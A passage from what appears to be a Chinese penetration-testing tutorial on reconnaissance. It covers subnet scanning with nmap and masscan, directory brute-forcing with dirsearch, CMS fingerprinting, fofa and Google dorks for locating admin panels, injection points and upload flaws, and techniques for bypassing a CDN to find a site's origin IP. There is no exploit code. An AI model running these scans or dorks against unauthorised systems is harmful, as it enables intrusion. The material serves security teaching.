<p>例如192.168.1.66 -&gt; 192.168.1.4 能够相互通讯可以控制该网段中的192.168.1.66，再通过内网横向移动来控制 192.168.1.4 </p>
<p>注意：一般情况下云服务器C段的IP都是相互独立的，这些服务器分属不同用户，没有渗透的必要</p>
<h5 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a><strong>在线查询网站</strong></h5><p><a target="_blank" rel="noopener" href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
<h5 id="工具扫描C段"><a href="#工具扫描C段" class="headerlink" title="工具扫描C段"></a><strong>工具扫描C段</strong></h5><p>一般可以扫描一些常见端口，来发现C段中在线的主机，比如</p>
<h5 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -A -vv 192.168.23.1&#x2F;24    # 很慢，慎用可以加-T参数
nmap -PR -vv 192.168.23.1&#x2F;24 -p 1-1000,8000-9000 --open  # arp 扫描, 速度快
nmap -PN -vv 192.168.23.1&#x2F;24 -p 1-1000 --open # 不使用ping扫描，能发现禁ping主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="masscan-1"><a href="#masscan-1" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan 192.168.23.1&#x2F;24 --ping   # icmp探测C段在线主机
masscan 192.168.23.1&#x2F;24 -p
21,22,80,137,138,139,443,445,1433,1434,1521,3306,6379,7001,8000,8080,9001 --open-only<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="御剑端口扫描"><a href="#御剑端口扫描" class="headerlink" title="御剑端口扫描"></a><strong>御剑端口扫描</strong></h5><h2 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h2><p>补天SRC：<a target="_blank" rel="noopener" href="https://www.butian.net/">https://www.butian.net/</a></p>
<p>公益SRC：<a target="_blank" rel="noopener" href="https://www.butian.net/Reward/plan/2">https://www.butian.net/Reward/plan/2</a></p>
<h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><ul>
<li><p>寻找到网站后台管理</p>
</li>
<li><p>寻找未授权界面</p>
</li>
<li><p>寻找网站更多隐藏信息</p>
</li>
<li><p>发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构</p>
</li>
<li><p>发现敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p>
</li>
</ul>
<h4 id="常见的后台管理页面："><a href="#常见的后台管理页面：" class="headerlink" title="常见的后台管理页面："></a>常见的后台管理页面：</h4><p><img src="/2023/012220963/7.PNG" alt="7"></p>
<h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>Robots协议(Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，同时也记录网站所具有基本的目录</p>
<p><img src="/2023/012220963/8.PNG" alt="8"></p>
<h3 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h3><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>dirsearch是一个基于python3的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p>
<p>GitHub：<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p>依赖安装： pip install -r requirements.txt</p>
<p>简单使用：python dirsearch.py -u 目标地址</p>
<h6 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">## 基本使用
-h  # 使用帮助
-u  # 指定目标url，最好加上协议类型 如http https
-L  # 指定url列表文件
-e  # 参数指定网站类型 php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak (-e *代表所有)

## 自定义选项
-w  # 指定字典扫描
-t  # 指定线程数（默认20）
-r  # 递归扫描 扫描到目录文件会进一步向下挖掘
-random-agents #使用随机UA
-H  # 使用指定headers (e.g. --header &quot;Referer: example.com&quot; --header &quot;User-Agent: IE&quot;)
-m  # 指定http请求方式，默认get
-d  # 发送的 data 数据
--cookie    # 添加 cookie
--proxy  # 添加代理 e.g. --proxy 127.0.0.1:1080

## 过滤扫描结果
-i &#x2F;         # http 状态码白名单 (e.g. 200,300-399)
-x &#x2F; --exclude-status    # 排除指定 http 状态码 （e.g.:301,403,500-599)
--exclude-texts  # 文本排除响应 (e.g.: &quot;Not found&quot;, &quot;Error&quot;)
--exclude-regexps   # 按regexp排除响应，用逗号分隔(e.g.: &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)

## 报告输出
-o 指定报告文件输出地址
--format 报告文件格式 (默认: simple, plain, json, xml,md,csv, html, sqlite)
--log 输出扫描日志文件 (一般不用)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>常规扫描</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定扫描的后缀名</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e php
python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e php<span class="token punctuation">,</span>html
python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>过滤状态码扫描</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span>
python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span><span class="token punctuation">,</span><span class="token number">404</span>
python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token operator">-</span><span class="token number">409</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>状态码白名单扫描</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>i <span class="token number">200</span>
python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>i <span class="token number">200</span><span class="token punctuation">,</span><span class="token number">302</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>指定线程数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>t <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用指定字典</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>w 字典路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>添加cookie信息</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>vulfocus<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token comment">#/ -e * --cookie "xxxxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定header头</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>vulfocus<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token comment">#/ -H "cookie: xxxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定输出报告</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">format</span> html <span class="token operator">-</span>o a<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<h4 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h4><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p>
<h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><p>1.网站特有文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>templets<span class="token operator">/</span>default<span class="token operator">/</span>style<span class="token operator">/</span>dedecms<span class="token punctuation">.</span>css  <span class="token operator">//</span>dedecms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.网站独有文件的md5</p>
<p>如favicon.ico，但是该文件可以被修改导致不准确。</p>
<p>文件md5计算 certutil -hashfile filename MD5</p>
<p>3.网站文件命名规则</p>
<p>4.返回头的关键字 shiro</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">header<span class="token operator">=</span><span class="token string double-quoted-string">"rememberMe=deleteMe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>5.网页关键字 dedecms</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>data<span class="token operator">/</span>admin<span class="token operator">/</span>ver<span class="token operator">.</span>txt
<span class="token operator">/</span>data<span class="token operator">/</span>sessions<span class="token operator">/</span>index<span class="token operator">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>6.Url特征</p>
<p>7.网站路径特征</p>
<p>8.网站静态资源</p>
<p>9.爬虫网站目录信息</p>
<p><strong>指纹识别对象</strong></p>
<p>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p>
<p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p>
<p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p>
<p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p>
<p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p>
<p>6、操作系统信息：比如linux、win2008、win7、kali、centos等；</p>
<p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p>
<p>8、WAF信息：是否使用waf，如Topsec、safedog、Yundun等；</p>
<p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p>
<p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p>
<p>示例网站：<a target="_blank" rel="noopener" href="http://ask.ltsec.com/">http://ask.ltsec.com/</a></p>
<h4 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h4><p>Kali工具：<strong>whatweb</strong></p>
<p>whatweb 域名 # 单个域名识别</p>
<h4 id="在线指纹识别："><a href="#在线指纹识别：" class="headerlink" title="在线指纹识别："></a>在线指纹识别：</h4><p><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
<p><a target="_blank" rel="noopener" href="http://pentest.gdpcisa.org/whatcms">http://pentest.gdpcisa.org/whatcms</a></p>
<h5 id="指纹探测插件：Wapplyzer"><a href="#指纹探测插件：Wapplyzer" class="headerlink" title="指纹探测插件：Wapplyzer"></a>指纹探测插件：Wapplyzer</h5><h4 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h4><h5 id="认识CDN"><a href="#认识CDN" class="headerlink" title="认识CDN"></a>认识CDN</h5><p>CDN是指内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器。</p>
<p><img src="/2023/012220963/9.PNG" alt="9"></p>
<p>通过中心平台的负载均衡内容分发，调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<p>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络内。</p>
<p>在用户访问网站时，利用全局负载技术将用户的访问<strong>指向距离最近的工作正常的缓存服务器上</strong>，由缓存服务器直接响应用户请求。</p>
<p><img src="/2023/012220963/10.PNG" alt="10"></p>
<h5 id="识别CDN"><a href="#识别CDN" class="headerlink" title="识别CDN"></a>识别CDN</h5><p>nslookup</p>
<p>多地ping网站：<a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a> <a target="_blank" rel="noopener" href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p>
<p>在线识别：<a target="_blank" rel="noopener" href="https://www.cdnplanet.com/tools/cdnfinder">https://www.cdnplanet.com/tools/cdnfinder</a></p>
<p>示例网站：<a target="_blank" rel="noopener" href="https://royalapps.com/">https://royalapps.com/</a> 、<a target="_blank" rel="noopener" href="https://taobao.com/">https://taobao.com</a></p>
<h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><h4 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h4><p>网址：<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
<p><strong>高级搜索</strong></p>
<p>&amp;&amp; = and </p>
<p>可以使用括号 和 &amp;&amp; (与) 、|| (或)、 != (非)、等符号，如</p>
<pre class="line-numbers language-none"><code class="language-none">title&#x3D;&quot;powered by&quot; &amp;&amp; title!&#x3D;&quot;discuz&quot;
body&#x3D;&quot;content&#x3D;WordPress&quot; || (header&#x3D;&quot;X-Pingback&quot; &amp;&amp; header&#x3D;&quot;&#x2F;xmlrpc.php&quot; &amp;&amp; 
body&#x3D;&quot;&#x2F;wp-includes&#x2F;&quot;) &amp;&amp; host&#x3D;&quot;gov.cn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>常用语法</strong></p>
<pre class="line-numbers language-none"><code class="language-none">domain&#x3D;&quot;qq.com&quot; #查询子域名
host&#x3D;&quot;.gov.cn&quot;   #从url中搜索&quot;.gov.cn&quot;
header&#x3D;&quot;thinkphp&quot; #从http头中搜索thinkphp
port&#x3D;&quot;6379&quot;       #查找对应“6379”端口的资产
ip&#x3D;&quot;1.1.1.1&quot;     #从ip中搜索包含“1.1.1.1”的网站
ip&#x3D;&quot;220.181.111.1&#x2F;24&quot;   #查询IP为“220.181.111.1”的C网段资产
status_code&#x3D;&quot;402&quot; #查询服务器状态为“402”的资产
app&#x3D;&quot;通达OA网络智能办公系统&quot;   # 搜索通达OA系统
country&#x3D;&quot;CN&quot;     # 搜索指定国家(编码)的资产
region&#x3D;&quot;Henan&quot;   # 搜索指定行政区的资产<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="360Quake"><a href="#360Quake" class="headerlink" title="360Quake"></a>360Quake</h4><p><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn/</a></p>
<h4 id="奇安信鹰图"><a href="#奇安信鹰图" class="headerlink" title="奇安信鹰图"></a>奇安信鹰图</h4><p><a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p>基本语法</p>
<p><strong>AND：缺一不可</strong></p>
<p>谷歌的默认搜索是and逻辑，意思就是，我们在输入关键字后进行搜索时，如输入：“program google”后，会搜出包含“program”和“google”的文件内容，如图</p>
<p><img src="/2023/012220963/11.PNG" alt="11"></p>
<p>基础布尔逻辑</p>
<p>对于一个搜索引擎来说，进行搜索的时候是要搜索到匹配到所有关键词的页面，还是包含关键词中的任意关键词就可以，取决于一个搜索引擎的一些特别算法，称之为搜索引擎的布尔逻辑默认值。</p>
<p><strong>OR：两者皆可</strong></p>
<p>而google就是用and作为默认逻辑（搜索到所有的关键词），当然这个前提是我们没有输入一些特殊的命令。如果你不确定你要搜索的内容，或者你想搜索两个中的任意一个，那么就要使用关键词“OR”。注意：OR是大写的，小写是不起作用的，而且，每一个关键词与“OR”之间是有一个空格的，我们来看一下搜索结果。</p>
<p><img src="/2023/012220963/12.PNG" alt="12"></p>
<p>当然，可以预想的是，google的结果要比program多得多，所以结果第一页全是有关google的内容。此外，还可以借助计算机体系语言中的“|”来代替“OR”，效果是一样的。</p>
<p><strong>“”</strong> <strong>：一刻都不能分割</strong></p>
<p>当然，如果你希望搜索“programgoogle”的内容，而不希望这两个单词之间有任何其他的内容，那么就要使用双引号把搜索的内容组成一个词组”programgoogle”来达到目的。如图所示。</p>
<p><img src="/2023/012220963/13.PNG" alt="13"></p>
<p>如上图所示，结果中的programgoogle都是在一起的，没有分割。当然这样的结果比较少，只有2740个，但是看图1，结果却有7亿多个。而且，大部分搜索引擎都有智能断句的功能，如果没有特殊的命令，搜索引擎会一定量的根据大众的语言使用习惯来判断你要搜索什么，而这样的做法，不仅仅没有使搜索引擎显得不听话，反而对大众来讲搜索引擎变得十分智能和高效！</p>
<p><strong>-</strong> <strong>：不想看到你</strong></p>
<p>但是如果我们只想看到“program”的内容，而不希望看到“google”的内容，就可以把“-”（减号或者破折号）应用到搜索当中去，语法为“program -google”，注意，“-”之前是有一个空格的，而其后却是和下一个关键词是紧紧相连的！搜索的结果如下图4所示。可以看得到结果中都会包含program，而不包含google</p>
<p><img src="/2023/012220963/14.PNG" alt="14"></p>
<p><strong>+</strong> <strong>：就想看到你</strong></p>
<p>说到这里，还要提一下google的约束扩展问题了。一般来说，当输入关键词后，google会把相关网页和信息的结果呈现在我们面前。然而，有一些单词在搜索引擎中是会被智能忽略的，导致我们得不到想要的结果。比如十分常用的“www”和“the”，基本上任何一个网页上都会找到的东西，就会被google自动忽略（不要觉得这样不好，还是那个道理，在实际引用当中这样做反而显得更加高效和智能）。如果我们不想忽略这些词进行查询，就得在这些关键词的前面加上符号“+”。如下图5所示：</p>
<p>看上去两者好像没有什么大的区别，其实仔细比较一下搜索结果就可以看得出，加上加号的搜索结果有一万多个，而不加加号的结果却有着55亿多！而因为google和www的关联度比较高，所以在前面的结果表现的差别不大。</p>
<p><img src="/2023/012220963/15.PNG" alt="15"></p>
<p><strong>“?”和“*” ：占位通配符</strong></p>
<p>除了上述字符之外，一些搜索引擎支持一种叫做“stemming”（填充）的技术。Stemming是指在查询的关键词中添加一些通配符，通常是“<em>”，有时候也可能是“？”，这些通配符的作用是要求搜索引擎进行查询是可以返回多个不同的结果。其中通配符代表占位，可以匹配其他任意字母和单词，而其他的字或词组与用户输入的相同。如我们想要搜索“Lionel Messi”的内容，却忘记了第一个单词的一些拼写，就可以输入“”l</em>Messi””进行查询，注意：此处整个字符串是要用一个英文半角双引号括住的！结果如下图所示。　</p>
<p>可以看到，google自动匹配出Lionel Messi的内容并且进行了搜索。这样的方式有利于我们只能记住单词或短语的一部分的内容时使用。</p>
<p><img src="/2023/012220963/16.PNG" alt="16"></p>
<p><strong>特殊语法</strong></p>
<pre class="line-numbers language-none"><code class="language-none">site：可以限制你搜索范围的域名；
inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；
intext: 只搜索网页&lt;body&gt;部分中包含的文字(也就是忽略了标题、URL等的文字)；
intitle: 查包含关键词的页面，一般用于社工别人的webshell密码；
filetype：搜索文件的后缀或者扩展名；
intitle：限制你搜索的网页标题；
inanchor: 搜素网站锚节点内容
cache   # 缓存搜索 cache 关键字 cache:secquan.org 当一个链接无法访问时（或信息被屏蔽时）；当信息已经被修改，想看以前的信息时<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>常用技巧</strong></p>
<pre class="line-numbers language-none"><code class="language-none">查找后台地址：
site:域名
inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|c
ms
查找文本内容：
site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系
统|admin|login|sys|managetem|password|username
查找可注入点：
site:域名 inurl:aspx|jsp|php|asp
查找上传漏洞：
site:域名 inurl:file|load|editor|Files
找eweb编辑器：
site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit
存在的数据库：
site:域名 filetype:mdb|asp|#
查看脚本类型：
site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp
迂回策略入侵：
inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="bing语法"><a href="#bing语法" class="headerlink" title="bing语法"></a>bing语法</h4><p>bing 搜索语法与 google类似</p>
<pre class="line-numbers language-none"><code class="language-none">inbody: 查找正文内容     inbody:密码|登陆
intitle: 查找标签内容
inanchor: 查找锚节点
filetype: 查找文件类型
site:返回属于指定网站的网页。若要搜索两个或更多域，请使用逻辑运算符OR对域进行分组
ip: 查找特点ip的网站<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="CDN识别-amp-amp-绕过"><a href="#CDN识别-amp-amp-绕过" class="headerlink" title="CDN识别&amp;&amp;绕过"></a>CDN识别&amp;&amp;绕过</h2><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p>
<h3 id="CDN识别-1"><a href="#CDN识别-1" class="headerlink" title="CDN识别"></a>CDN识别</h3><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>GET 请求页面/文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CDN。</p>
<p><img src="/2023/012220963/17.PNG" alt="17"></p>
<h4 id="ping域名"><a href="#ping域名" class="headerlink" title="ping域名"></a>ping域名</h4><p>ping 域名，查看 ping 的实际地址，若实际地址为 CDN 节点地址，则表示有走 CDN。</p>
<p><img src="/2023/012220963/18.PNG" alt="18"></p>
<h4 id="nslookup解析"><a href="#nslookup解析" class="headerlink" title="nslookup解析"></a>nslookup解析</h4><p>nslookup 域名，若解析结果有多个，很有可能存在CDN，相反，若解析结果只有一个，可能不存在CDN(不能肯定)。</p>
<p><img src="/2023/012220963/19.PNG" alt="19"></p>
<h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>利用多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p>
<p><img src="/2023/012220963/20.PNG" alt="20"></p>
<h3 id="CDN厂商"><a href="#CDN厂商" class="headerlink" title="CDN厂商"></a>CDN厂商</h3><h4 id="CDN厂商识别"><a href="#CDN厂商识别" class="headerlink" title="CDN厂商识别"></a>CDN厂商识别</h4><p><a target="_blank" rel="noopener" href="https://www.cdnplanet.com/tools/cdnfinder/#">https://www.cdnplanet.com/tools/cdnfinder/#</a></p>
<p><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/whichcdn/">http://tools.bugscaner.com/whichcdn/</a></p>
<p>国外厂商：CloudFlare、StackPath、Fastly、CDNetworks、CacheFly、CloudFront</p>
<p>国内厂商：阿里云CDN、Ucloud、Nodecache、腾讯云CDN、网宿CDN、白山CDN、金山CDN</p>
<p>CloudFlare <a target="_blank" rel="noopener" href="https://gyzzwk.ml/">https://gyzzwk.ml/</a></p>
<p>StackPath <a target="_blank" rel="noopener" href="https://151.139.113.56/">https://151.139.113.56/</a></p>
<p> Alibaba <a target="_blank" rel="noopener" href="https://www.taobao.com/">https://www.taobao.com/</a></p>
<p>Wangsu <a target="_blank" rel="noopener" href="https://www.chinaz.com/">https://www.chinaz.com</a></p>
<p>Tencent Cloud <a target="_blank" rel="noopener" href="https://qq.com/">https://qq.com</a></p>
<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>CDN是付费的，一些网站主站因为业务需要可能做了CDN加速，但是其他域名可能没有做CDN加速。</p>
<p>案例：xueersi.com</p>
<h4 id="第三方网站查询"><a href="#第三方网站查询" class="headerlink" title="第三方网站查询"></a>第三方网站查询</h4><p>网站IP&amp;地址查询：<a target="_blank" rel="noopener" href="https://get-site-ip.com/">https://get-site-ip.com/</a></p>
<p>历史DNS信息查询：<a target="_blank" rel="noopener" href="https://securitytrails.com/app/account">https://securitytrails.com/app/account</a></p>
<h4 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h4><p>ping工具：<a target="_blank" rel="noopener" href="https://ping.sx/ping">https://ping.sx/ping</a></p>
<p><a target="_blank" rel="noopener" href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p>
<p>案例：sp910.com</p>
<h4 id="邮件服务器获取ip"><a href="#邮件服务器获取ip" class="headerlink" title="邮件服务器获取ip"></a>邮件服务器获取ip</h4><p>目标服务器主动连接我们时，不会受到CDN影响目标网站存在邮件验证等功能时，我们通过查看邮件源码，可能获取邮件服务器IP地址 及 发件人 IP地址。</p>
<h4 id="文件指纹搜索"><a href="#文件指纹搜索" class="headerlink" title="文件指纹搜索"></a>文件指纹搜索</h4><p>查询网站：shodan.io</p>
<p>icohash.py # 因为 shodan 高级功能要收费，通过脚本可以获取 ico hash。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mmh3
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/favicon.ico'</span><span class="token punctuation">)</span>
favicon <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">hash</span> <span class="token operator">=</span> mmh3<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>favicon<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'http.favicon.hash:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>案例：baidu.com</p>
